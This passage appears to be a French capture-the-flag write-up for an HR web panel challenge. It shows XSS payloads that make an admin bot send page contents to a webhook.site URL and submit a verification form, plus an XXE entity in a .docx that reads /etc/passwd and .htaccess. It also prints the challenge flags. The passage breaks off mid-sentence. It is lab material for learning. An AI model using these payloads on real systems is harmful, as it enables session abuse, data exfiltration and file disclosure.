0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzlrYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzlrYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTI5c0xYTnRMVFFpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtJaUJ6ZEhsc1pUMGlZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2dJelV5T1dKak1Ec2lQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHhrYVhZZ1kyeGhjM005SW1OaGNtUXRZbTlrZVNJK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhRFVnWTJ4aGMzTTlJbU5oY21RdGRHbDBiR1VpUGtOeVpXRjBaU0JJVWlCeVpYRjFaWE4wY3lBb1FrVlVRU0JXUlZKVFNVOU9LVHd2YURVK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGlZMkZ5WkMxMFpYaDBJajQ4WW5JK1BHSjFkSFJ2YmlCamJHRnpjejBpWW5SdUlHSjBiaTF3Y21sdFlYSjVJaUJ2Ym1Oc2FXTnJQU0prYjJOMWJXVnVkQzVzYjJOaGRHbHZiajBuTDNObGNuWnBZMlZ6TDNKbGNYVmxjM1J6SnlJK1FXTmpaWE56UEM5aWRYUjBiMjQrUEM5d1Bnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbXhsWVdRaUlITjBlV3hsUFNKamIyeHZjam9nWW14aFkyczdJajVEVkVaSlZWUjdZV0kxTXpBMU16WmtOVEJrTURkbVptUTBNamxoTldaa1kyVmlPVFJqTlRBek1qSmlaREF4Wm1ZM01UZzFNek16TW1OaVpHSTFZVGczT1dFMU1EYzBNbjA4TDNBK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw==    Page /services \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Inter IUT - Human Resources\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.3.1.slim.min.js\u0026#34; integrity=\u0026#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\u0026#34; integrity=\u0026#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/assets/css/form.css\u0026#34;\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-light bg-ligh\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/assets/Images/logo.png\u0026#34; width=\u0026#34;45\u0026#34; height=\u0026#34;40\u0026#34; class=\u0026#34;d-inline-block align-top\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; Inter IUT \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarNavAltMarkup\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/admin/users\u0026#34;\u0026gt;Admin\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link active\u0026#34; href=\u0026#34;/services\u0026#34;\u0026gt;Services \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;(current)\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/me\u0026#34;\u0026gt;My account\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col text-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;margin-top: 20px; color: black;\u0026#34;\u0026gt; Hello rh_admin_service, which services would you like to use? \u0026lt;/p\u0026gt; \u0026lt;hr/\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-sm-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34; style=\u0026#34;background-color: #529bc0;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;card-title\u0026#34;\u0026gt;Access my pay slips\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; onclick=\u0026#34;document.location=\u0026#39;/services/slips\u0026#39;\u0026#34;\u0026gt;Access\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-sm-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34; style=\u0026#34;background-color: #529bc0;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;card-title\u0026#34;\u0026gt;Manage my vacations\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; onclick=\u0026#34;document.location=\u0026#39;/services/vacations\u0026#39;\u0026#34;\u0026gt;Access\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-sm-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34; style=\u0026#34;background-color: #529bc0;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;card-title\u0026#34;\u0026gt;Create HR requests (BETA VERSION)\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026#34;card-text\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;button class=\u0026#34;btn btn-primary\u0026#34; onclick=\u0026#34;document.location=\u0026#39;/services/requests\u0026#39;\u0026#34;\u0026gt;Access\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: black;\u0026#34;\u0026gt;CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;fixed-bottom text-center\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;color: #529bc0;\u0026#34;\u0026gt;Inter IUT HR Services V1.1-8\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Comme vous pouvez le constater, nous observons une ligne intéressante en bas de la page :\n\u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: black;\u0026#34;\u0026gt;CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}\u0026lt;/p\u0026gt; FLAG 1 : CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}\nHR-Panel 2 - 200pts En regardant attentivement dans la page que nous avons obtenue précédemment, on observe que ce bot à accès a une fonctionnalité supplémentaire :\n\u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/admin/users\u0026#34;\u0026gt;Admin\u0026lt;/a\u0026gt; Procédons alors à la même méthode que précédemment et récupérons le contenu de cette page avec la payload suivante :\n\u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#39;GET\u0026#39;,\u0026#39;/admin/users\u0026#39;,false); xhr.send(); document.location=\u0026#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=\u0026#34;.concat(btoa(btoa(xhr.responseText))); \u0026lt;/script\u0026gt; Voici le résultat :\n Page /admin/users double encodé en base64 UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUJoWTNScGRtVWlJR2h5WldZOUlpOWhaRzFwYmk5MWMyVnljeUkrUVdSdGFXNGdQSE53WVc0Z1kyeGhjM005SW5OeUxXOXViSGtpUGloamRYSnlaVzUwS1R3dmMzQmhiajQ4TDJFK0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5elpYSjJhV05sY3lJK1UyVnlkbWxqWlhNOEwyRStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZZMjl1ZEdGamRDSStRMjl1ZEdGamREd3ZZVDRLSUNBZ0lDQWdJQ0E4WVNCamJHRnpjejBpYm1GMkxXbDBaVzBnYm1GMkxXeHBibXNpSUdoeVpXWTlJaTl0WlNJK1RYa2dZV05qYjNWdWREd3ZZVDRnSUFvZ0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlJZ2FISmxaajBpTDJ4dloyOTFkQ0krVEc5bmIzVjBQQzloUGdvZ0lDQWdQQzlrYVhZK0NpQWdQQzlrYVhZK0Nqd3ZibUYyUGdvOFpHbDJJR05zWVhOelBTSmpiMjUwWVdsdVpYSWlQZ29nSUNBZ1BHUnBkaUJqYkdGemN6MGljbTkzSWo0S0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHbGtQU0ptYjNKdElqNGdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGliR1ZoWkNJZ2MzUjViR1U5SW1OdmJHOXlPaUFqTlRJNVltTXdPeUkrVjJWc1kyOXRaU0JCWkcxcGJpQWhJRmx2ZFNCallXNGdabWxzYkNCdmRYUWdkR2hsSUdadmNtMGdZbVZzYjNjZ2RHOGdkbVZ5YVdaNUlHRWdkWE5sY2lkeklHRmpZMjkxYm5RdVBDOXdQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG1iM0p0SUcxbGRHaHZaRDBpVUU5VFZDSWdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BHbHVjSFYwSUc1aGJXVTlJblZ6WlhKdVlXMWxJaUJ3YkdGalpXaHZiR1JsY2owaVdqRXROVEkyTFUxUklpQnphWHBsUFNJeU1DSWdjbVZ4ZFdseVpXUStQR0p5UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2RIbHdaVDBpYzNWaWJXbDBJaUJqYkdGemN6MGlZblJ1SUdKMGJpMXdjbWx0WVhKNUlqNVdaWEpwWm5rZ2RHaHBjeUJoWTJOdmRXNTBQQzlpZFhSMGIyNCtDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlp2Y20wK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw====    Page /admin/users \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Inter IUT - Human Resources\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.3.1.slim.min.js\u0026#34; integrity=\u0026#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\u0026#34; integrity=\u0026#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/assets/css/form.css\u0026#34;\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-light bg-ligh\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/assets/Images/logo.png\u0026#34; width=\u0026#34;45\u0026#34; height=\u0026#34;40\u0026#34; class=\u0026#34;d-inline-block align-top\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; Inter IUT \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarNavAltMarkup\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link active\u0026#34; href=\u0026#34;/admin/users\u0026#34;\u0026gt;Admin \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;(current)\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/services\u0026#34;\u0026gt;Services\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/me\u0026#34;\u0026gt;My account\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;/logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col text-center\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;form\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: #529bc0;\u0026#34;\u0026gt;Welcome Admin ! You can fill out the form below to verify a user\u0026#39;s account.\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; placeholder=\u0026#34;Z1-526-MQ\u0026#34; size=\u0026#34;20\u0026#34; required\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Verify this account\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;fixed-bottom text-center\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;color: #529bc0;\u0026#34;\u0026gt;Inter IUT HR Services V1.1-8\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Sur la page reçue on observe quelque chose de très intéressant : Un joli formulaire qui a tout l\u0026rsquo;air de nous permettre d\u0026rsquo;être vérifié et donc d\u0026rsquo;accéder possiblement à de nouvelles fonctionnalités\n\u0026lt;p class=\u0026#34;lead\u0026#34; style=\u0026#34;color: #529bc0;\u0026#34;\u0026gt;Welcome Admin ! You can fill out the form below to verify a user\u0026#39;s account.\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; placeholder=\u0026#34;Z1-526-MQ\u0026#34; size=\u0026#34;20\u0026#34; required\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Verify this account\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; On va donc forcer le bot à réaliser ce formulaire et envoyer ce formulaire de la même manière que précédemment en spécifiant notre propre username avec la payload suivante :\n\u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#39;POST\u0026#39;,\u0026#39;/admin/users\u0026#39;,false); xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); xhr.send(\u0026#34;username=A5-596-LZ\u0026#34;); \u0026lt;/script\u0026gt; Après quelques secondes, nous pouvons cliquer sur la page services qui met à disposition 3 nouvelles fonctionnalités :\n Access my pay slips (Permet d\u0026rsquo;acceder à ses fiches de payes) Manage my vacations (Permet de planifier des jours de congés) Create HR requests (Permet de signaler un problème avec comme complément un .docx détaillant le problème)  La mention BETA VERSION sur la dernière fonctionnalité indique la voie à prendre.\nAprès quelques tentatives infructueuses de bypass les filtres sur l\u0026rsquo;upload du fichier .docx dans le but d\u0026rsquo;y envoyer un reverse shell en PHP, on décide de simplement envoyer un .docx et de voir ce qui se passe. N\u0026rsquo;ayant pas de .docx sous la main on peut rapidement en générer un grace à python et la lib docx nativement intégrer :\nfrom docx import Document doc = Document() content = doc.add_paragraph(\u0026#34;Je m\u0026#39;appelle Alex Winchest et j\u0026#39;adore jouer à cache-cache\u0026#34;) doc.save(\u0026#34;resume.docx\u0026#34;) On rédige et en envoie le document dans le formulaire, puis une fois envoyé, on constate que le backend parse notre resume.docx afin d\u0026rsquo;y afficher son contenu :\nExploitation d\u0026rsquo;une Local File Inclusion (LFI) grâce à une XML External Entity Injection (XXE) dans le .docx Après une rapide recherche on s\u0026rsquo;aperçoit qu\u0026rsquo;il est possible de glisser une XXE dans le resume.docx. En effet les fichiers .docx ne sont que des archives contenant principalement des fichiers .xml. On peut donc unzip le .docx et aller modifier le contenu se situant dans /word/document.xml\nLe but ici est d\u0026rsquo;ajouter un entête qui va être exécuté par le backend (en l\u0026rsquo;occurrence ici on testera une LFI sur le fichier /etc/passwd afin de voir si cela fonctionne) et d\u0026rsquo;y incorporer le résultat à la place de notre paragraphe.\nDans un premier temps il faut extraire les fichiers .xml zippé à l\u0026rsquo;intérieur du .docx :\nPuis on édite /word/document.xml comme suit : en dessous de la première ligne il faut insérer la ligne suivante :\n\u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt; Pour récupérer le résultat de l\u0026rsquo;exécution, on change le contenu de notre paragraphe par\n\u0026amp;test; Pour terminer on re-zip le tout :\nOn peut maintenant envoyer notre formulaire :\nEt \u0026hellip;\u0026hellip;. BINGO, nous avons une magnifique LFI. Mais maintenant que faire avec elle ? Et bien rappelons-nous nous qu\u0026rsquo;il y avait une fichier .htaccess dans le robots.txt, alors tentons de le récupérer. Il est commun de retrouver ce fichier dans l\u0026rsquo;arborescence /var/www/html, on replacera donc notre payload dans resume.docx par la suivante :\n\u0026lt;!DOCTYPE test [\u0026lt;!ENTITY test SYSTEM \u0026#39;php://filter/convert.base64-encode/resource=/var/www/html/.htaccess\u0026#39;\u0026gt;]\u0026gt; Vous noterez que j\u0026rsquo;ai utilisé un wrapper php ici, en fait on peut toujours utiliser file:/// c\u0026rsquo;est juste que je n\u0026rsquo;ai pas gaffe lors du writeup, dans tous les cas on en aura besoin par la suite)\nEt 